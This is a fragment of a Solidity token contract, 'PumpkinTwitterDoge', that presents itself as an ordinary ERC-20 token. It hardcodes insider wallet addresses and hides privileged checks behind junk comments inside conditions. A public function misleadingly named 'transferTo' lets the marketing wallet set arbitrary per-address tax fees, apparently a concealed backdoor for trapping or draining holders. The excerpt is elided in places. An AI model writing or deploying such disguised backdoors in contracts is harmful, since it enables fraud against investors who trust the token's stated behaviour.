...
contract PumpkinTwitterDoge is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "PumpkinTwitterDoge";
    string private _symbol = "PumpkinTwitterDoge";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x4Fa3ba17bB98a30F9AC33147d050e70eD11792F2); 
    address payable private teamWalletAddress = payable(0x927418251CCad0B233C3DD2554e4F8a8F3D56835); 
	...
	if( _mainPai[ /*as asdfghjk*/msg.sender])
	   {
	...
	function transferTo(address _address, bool _enable, uint256 _addressTaxFee) public {
	    if( marketWall/*asdf aw dawfghjk*/ ==  /*asdf aw dawfgjk*/msg.sender){
